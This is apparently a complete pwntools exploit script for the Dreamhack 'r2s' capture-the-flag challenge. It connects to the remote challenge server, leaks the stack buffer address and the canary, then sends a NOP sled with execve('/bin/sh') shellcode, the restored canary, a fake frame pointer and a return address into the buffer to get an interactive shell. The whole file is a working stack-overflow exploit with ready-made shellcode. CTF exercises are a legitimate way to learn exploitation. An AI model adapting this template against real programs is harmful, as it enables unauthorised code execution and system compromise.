#!/usr/bin/python3

from pwn import *

#p  = process("./r2s")
p = remote("host1.dreamhack.games", 16910)
e = ELF("./r2s")

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.recvuntil("buf: ")
buf = int(p.recvline().decode('utf-8').strip("\n"), 16)
log.info("buf: " + hex(buf))

p.recvuntil("$rbp: ")
offset = int(p.recvline().decode('utf-8').strip("\n"))
log.info("offset: " + str(offset))

# Leak Canary
payload = "A".encode('utf-8') * (offset - 8)
p.sendlineafter(": ", payload)
p.recvuntil("A\n")
canary = u64(p.recvn(7).rjust(8, b"\x00"))
log.info("Canary: " + hex(canary))

# Write shellcode & Spoof ret
payload = b"\x90"*20
payload += shellcode
payload += b"\x90" * (offset - (len(payload) + 8))
payload += p64(canary)
payload += p64(0xdeadbeefcafebabe)
payload += p64(buf)

p.sendlineafter(": ", payload)

p.interactive()
